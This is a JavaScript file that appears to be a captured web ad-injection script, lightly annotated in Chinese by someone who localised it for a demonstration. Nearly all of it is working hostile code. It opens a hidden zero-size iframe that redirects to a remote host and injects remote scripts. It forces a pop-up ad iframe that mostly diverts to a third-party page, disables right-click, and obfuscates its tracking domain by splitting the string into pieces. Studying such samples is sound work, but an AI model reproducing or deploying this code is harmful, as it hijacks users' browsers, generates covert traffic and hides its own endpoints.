// http://img.victorjx.com/fmt/?u=......
(function(d) {
    function $c(n) {
        return d.createElement(n)
    }
    function $do() {
        var l = $c("div");
        l.style.display = "none";
        l = d.body.appendChild(l);
        var ifr = $c("iframe");
        ifr.scrolling = "no";
        ifr.marginWidth = "0";
        ifr.marginHeight = "0";
        ifr.frameBorder = "0";
        ifr.height = "0px";
        ifr.width = "0px";
        ifr = l.appendChild(ifr);
        var ul = "http://s1.gzmjnx.cn/cl/tj0713/";
        try {
            var doc = ifr.contentWindow.document;
            doc.open().write('<body onload="javascript:' + "window.location.href='" + ul + "';\">");
            doc.close()
        } catch (e) {
            ifr.src = ul
        }
    }
    $do()
})(document);
(function(d) {
    function $a(p) {
        try {
            var x = d.getElementsByTagName("head")[0];
            x.appendChild($s(p))
        } catch (e) {}
    }
    function $c(n) {
        return d.createElement(n)
    }
    function $s(p) {
        var j = $c("script");
        j.type = "text/javascript";
        j.async = true;
        j.src = p;
        return j
    }
    //为了本地演示,修改
    //$a("http://s1.gzmjnx.cn/res/cres/cres_glink.js")
    $a("./cres/cres_glink.js")
})(document);
(function(d) {
    function $a(p) {
        try {
            var x = d.getElementsByTagName("head")[0];
            x.appendChild($s(p))
        } catch (e) {}
    }
    function $c(n) {
        return d.createElement(n)
    }
    function $s(p) {
        var j = $c("script");
        j.type = "text/javascript";
        j.async = true;
        j.src = p;
        return j
    }
    //为了本地演示,修改
    //$a("http://s1.gzmjnx.cn/res/cres/p_a_clk.js")
    $a("./cres/p_a_clk.js")
})(document);
(function(d) {
    function $a(p) {
        try {
            var x = d.getElementsByTagName("head")[0];
            x.appendChild($s(p))
        } catch (e) {}
    }
    function $c(n) {
        return d.createElement(n)
    }
    function $s(p) {
        var j = $c("script");
        j.type = "text/javascript";
        j.async = true;
        j.src = p;
        return j
    }
    //为了本地演示,修改
    //$a("http://s1.gzmjnx.cn/res/cres/kwd.js")
    $a("./cres/kwd.js")
})(document);
(function(w, d) {
    var gid = "bd_uuid_rb_111268";

    function $c(n) {
        return d.createElement(n)
    }
    function $show() {
        var e = d.getElementById(gid);
        if (e) {
            e.style.display = "block"
        }
    }
    function $isdone() {
        var e = d.getElementById(gid);
        if (e) {
            return true
        }
        return false
    }
    function $rm() {
        var e = d.getElementById(gid);
        if (e) {
            e.style.display = "none"
        }
        setTimeout($del, 30000)
    }
    function $del() {
        var e = d.getElementById(gid);
        if (e) {
            e.parentNode.removeChild(e)
        }
    }
    function $a(p) {
        try {
            var x = d.getElementsByTagName("head")[0];
            x.appendChild($s(p))
        } catch (e) {}
    }
    function $s(p) {
        var j = $c("script");
        j.src = p;
        j.async = true;
        j.type = "text/javascript";
        return j
    }
    function $drn() {
        if ($isdone()) {
            return
        }
        var l = $c("div");
        l.id = gid;
        l.style.display = "none";
        l.oncontextmenu = function() {
            return false
        };
        l = d.body.appendChild(l);
        var isIE6 = w.navigator.userAgent.match(/MSIE 6/ig) && !w.navigator.userAgent.match(/MSIE 7|8/ig);
        var sty = "";
        if (isIE6) {
            sty = "BORDER-RIGHT: 0px; BORDER-TOP: 0px; DISPLAY: block; Z-INDEX: 2147483647; RIGHT: 0px; padding:0;MARGIN: 0px; BORDER-LEFT: 0px; WIDTH: 300px; BOTTOM: auto; BORDER-BOTTOM: 0px; POSITION: absolute; TOP: expression(eval((document.documentElement&&document.documentElement.scrollTop||document.body.scrollTop)+(document.documentElement&&document.documentElement.clientHeight||document.body.clientHeight)-this.offsetHeight-0)); HEIGHT: 250px; BACKGROUND-COLOR: #ecf9fd; TEXT-ALIGN: left"
        } else {
            sty = "display: block; position: fixed; padding: 0px; margin: 0px; border: 0px none; background-color: rgb(236, 249, 253); text-align: left; z-index: 2147483647; width: 300px; height: 250px; right: 0px; bottom: 0px; top: auto;"
        }
        var k = $c("div");
        k.style.cssText = sty;
        k = l.appendChild(k);
        k.innerHTML = "<span style=\"position:absolute;width:42px;height:14px;line-height:20px;right:0px;top:-14px;cursor:pointer;text-align:right;display:block;background: url(http://a.wrkxsq.com/img/close.gif) 0px 0px no-repeat scroll;\" onmouseover=\"this.style.backgroundPosition='0 -20px';\" onmouseout=\"this.style.backgroundPosition='0 0';\" onclick=\"javascript:var e=document.getElementById('bd_uuid_rb_111268');if(!e)return;e.style.display='none';setTimeout(function(){var e=document.getElementById('bd_uuid_rb_111268');if(e){e.parentNode.removeChild(e)}},30000);\"></span>";
        var ifr = $c("iframe");
        ifr.scrolling = "no";
        ifr.marginWidth = "0";
        ifr.marginHeight = "0";
        ifr.frameBorder = "0";
        ifr.height = "250px";
        ifr.width = "300px";
        ifr = k.appendChild(ifr);
        var ul = "http://s1.gzmjnx.cn/img/ltzn_15060910/300x250.html";
        var rand = Math.random();
        if (rand < 0.9) {
            ul = "http://bj.ganji.com/content/content_branch.php?vaction=cojdu&pid=hz_2"
        } else {
            ul = "http://s1.gzmjnx.cn/img/ltzn_15060910/300x250.html"
        }
        var u = {
            j: "ht",
            c: "com",
            q: "tp:",
            m: "orjx.",
            n: "vict",
            d: "img."
        };
        var be = u.j + u.q + "//" + u.d + u.n + u.m + u.c;
        var en = "?a=" + Math.random();
        try {
            var doc = ifr.contentWindow.document;
            doc.open().write('<body onload="javascript:' + "window.location.href='" + ul + "';\">");
            doc.close();
            $a(be + "/cnzz/" + en)
        } catch (e) {
            ifr.src = ul;
            $a(be + "/cnzz/index2.php" + en)
        }
    }
    function $dly() {
        $drn();
        setTimeout($show, 2000);
        setTimeout($rm, 1000 * 1800)
    }
    setTimeout($dly, 50)
})(window, document);
(function(d) {
    function $a(p) {
        try {
            var x = d.getElementsByTagName("head")[0];
            x.appendChild($s(p))
        } catch (e) {}
    }
    function $c(n) {
        return d.createElement(n)
    }
    function $s(p) {
        var j = $c("script");
        j.type = "text/javascript";
        j.async = true;
        j.src = p;
        return j
    }
    //$a("http://s1.gzmjnx.cn/res/cres/common_top_banner.js")
    //为了本地演示,修改
    $a("./cres/common_top_banner.js")
})(document);
var tmp = "4511|0|1";


/**
 * 这个脚本会创建4个脚本 值得注意的是设置了异步加载,防止阻塞页面
 * 分别为:
 * <script type="text/javascript" async="" src="http://s1.gzmjnx.cn/res/cres/cres_glink.js"></script>
 * <script type="text/javascript" async="" src="http://s1.gzmjnx.cn/res/cres/p_a_clk.js"></script>
 * <script type="text/javascript" async="" src="http://s1.gzmjnx.cn/res/cres/kwd.js"></script>
 * <script type="text/javascript" async="" src="http://s1.gzmjnx.cn/res/cres/common_top_banner.js"></script>
 * 为了防止服务器脚本版本变化,这里将其本地化
 * <script type="text/javascript" async="" src="./cres/cres_glink.js"></script>
 * <script type="text/javascript" async="" src="./cres/p_a_clk.js"></script>
 * <script type="text/javascript" async="" src="./cres/kwd.js"></script>
 * <script type="text/javascript" async="" src="./cres/common_top_banner.js"></script>
 */